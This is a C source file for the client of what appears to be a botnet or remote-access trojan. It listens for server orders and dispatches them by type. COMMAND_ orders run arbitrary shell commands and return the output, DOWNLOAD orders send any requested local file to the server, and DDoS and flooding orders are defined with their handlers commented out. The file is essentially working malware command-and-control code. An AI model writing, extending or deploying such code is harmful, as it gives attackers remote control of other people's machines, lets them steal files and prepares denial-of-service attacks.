#include <stdlib.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h> 

#include "../../include/client/client_utils.h"
#include "../../include/logging.h"
#include "../../include/send_message.h"
#include "../../include/receive_message.h"
#include "../../include/commands.h"
#include "../../include/file_exchange.h"

// Check the 8 first characters of the buffer to check the order type
enum OrderType get_order_enum_type(const char *buffer) {
    char flag[9];
    strncpy(flag, buffer, 8); // Copy the first 8 characters
    flag[8] = '\0'; // Null-terminate the string

    if (strcmp(flag, "COMMAND_") == 0) return COMMAND_;
    if (strcmp(flag, "ASKLOGS_") == 0) return ASKLOGS_;
    if (strcmp(flag, "ASKSTATE") == 0) return ASKSTATE;
    if (strcmp(flag, "DDOSATCK") == 0) return DDOSATCK;
    if (strcmp(flag, "FLOODING") == 0) return FLOODING;
    if (strncmp(buffer, "DOWNLOAD", 8) == 0) return DOWNLOAD;
    return UNKNOWN; // warning: unknown enum value is 5
}

// Return a buffer storing the n_last_line lines of the main.log file or all of the lines if n_last_line <= 0
char* read_client_log_file(int n_last_line) {
    FILE *file = fopen("main.log", "r");
    if (!file) {
        perror("Error while opening log file");
        return NULL;
    }

    char *buffer;

    if(n_last_line <= 0) {
        fseek(file, 0, SEEK_END);
        long filesize = ftell(file); // Cursor position, get file byte size
        fseek(file, 0, SEEK_SET);

        buffer = malloc(filesize + 1);
        size_t read_size = fread(buffer, 1, filesize, file); // read all the file
        buffer[read_size] = '\0';
    }
    else {
        fseek(file, 0, SEEK_END);
        long filesize = ftell(file);
        long pos = filesize - 1; // begin at the end of the file before \0
        int newline_count = 0;

        // getting the cursor position to begin reading the n_last_line lines of the file
        while (pos >= 0 && newline_count <= n_last_line) {
            fseek(file, pos, SEEK_SET);
            int c = fgetc(file);
            if (c == '\n') {
                newline_count++;
            }
            pos--;
        }
        long start_pos = pos + 1;
        fseek(file, start_pos, SEEK_SET);

        buffer = malloc(filesize + 1);
        long read_size = filesize - start_pos;
        fread(buffer, 1, filesize, file);
        buffer[read_size] = '\0';
    }

    fclose(file);
    return buffer;
}

int parse_and_execute_command(const Command cmd, int sockfd) {
    // Check if the command is a `cd` command
    if (strcmp(cmd.program, "cd") == 0) {
        if (cmd.params && cmd.params[0]) {
            // Strip quotes from the directory name if present
            char *directory_name = cmd.params[0];
            size_t len = strlen(directory_name);
            if (directory_name[0] == '"' && directory_name[len - 1] == '"') {
                directory_name[len - 1] = '\0'; // Remove trailing quote
                directory_name++;              // Move past the leading quote
            }

            // Change the working directory
            if (chdir(directory_name) == 0) {
                send_message(sockfd, "Directory changed successfully");
            } else {
                send_message(sockfd, "Failed to change directory");
            }
        } else {
            send_message(sockfd, "No directory specified");
        }

        return 0; // No further processing needed
    }

    // Check if the command is a `pwd` command
    if (strcmp(cmd.program, "pwd") == 0) {
        char cwd[1024];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            output_log("Sending cwd: %s\n", LOG_DEBUG, LOG_TO_CONSOLE, cwd);
            send_message(sockfd, cwd); // Send the current working directory back to the server
        } else {
            send_message(sockfd, "Error retrieving cwd");
        }

        return 0; // No further processing needed
    }

    // Execute other commands
    char result_buffer[4096] = {0};
    int exit_code = execute_command(&cmd, result_buffer, sizeof(result_buffer));

    // Send the result back to the server
    if (exit_code >= 0) {
        send_message(sockfd, result_buffer);
    } else {
        send_message(sockfd, "Command execution failed");
    }

    return exit_code;
}

void receive_and_process_message(int sockfd) {
    char buffer[1024];

    // Receive the message from the server
    int bytes_received = receive_message_client(sockfd, buffer, sizeof(buffer), recv);
    if (bytes_received == -99) {
        return; // File upload success
    }
    if (bytes_received < 0) {
        output_log("Failed to receive message from server\n", LOG_ERROR, LOG_TO_ALL);
        return; // Erreur de réception
    }

    output_log("Done receiving, preparing to parse and execute\n", LOG_DEBUG, LOG_TO_CONSOLE);
    Command cmd;
    deserialize_command(buffer, &cmd);

    switch (cmd.order_type) {
        case COMMAND_:
            output_log("Preparing for COMMAND_ parsing and execution\n", LOG_DEBUG, LOG_TO_CONSOLE);
            parse_and_execute_command(cmd, sockfd);
            break;
        case ASKLOGS_:
            //send_logs_to_server(sockfd);
            break;
        case ASKSTATE:
            //send_state_to_server(sockfd);
            break;
        case DDOSATCK:
            //launch_ddos(cmd, sockfd);
            break;
        case FLOODING:
            //launch_flood(cmd, sockfd);
            break;
        case DOWNLOAD:
            output_log("Preparing for DOWNLOAD request\n", LOG_DEBUG, LOG_TO_CONSOLE);
            send_file(sockfd,cmd.params[0]);
            break;
        case UNKNOWN:
            output_log("Unknown command type received\n", LOG_WARNING, LOG_TO_CONSOLE);
            break;
    }

    free_command(&cmd); // Nettoyer correctement après
    return ;
}


